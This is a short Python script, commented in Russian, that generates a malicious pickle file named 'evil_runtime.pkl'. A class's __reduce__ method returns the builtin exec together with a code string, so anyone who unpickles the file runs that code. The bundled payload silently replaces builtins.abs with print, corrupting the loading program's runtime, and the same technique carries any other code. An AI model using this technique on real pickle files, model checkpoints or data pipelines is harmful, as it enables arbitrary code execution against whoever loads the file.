import pickle

# Используем встроенную функцию exec, обращаясь к ней напрямую.
# Pickle умеет записывать ссылки на базовые функции builtins по их имени,
# не пытаясь тащить за собой сам объект модуля.
target_function = exec
payload_code = "import builtins; builtins.setattr(builtins, 'abs', builtins.print)"

class PurePayload:
    def __reduce__(self):
        # Возвращаем только чистую функцию и кортеж со строкой.
        # Здесь нет ни одной переменной-модуля.
        return (target_function, (payload_code,))

try:
    # Сериализуем
    bd = pickle.dumps(PurePayload())
    
    with open("./evil_runtime.pkl", "wb") as f:
        f.write(bd)
    print("[+] Файл evil_runtime.pkl успешно сгенерирован!")
    
except TypeError as e:
    print(f"[-] Ошибка сериализации: {e}")
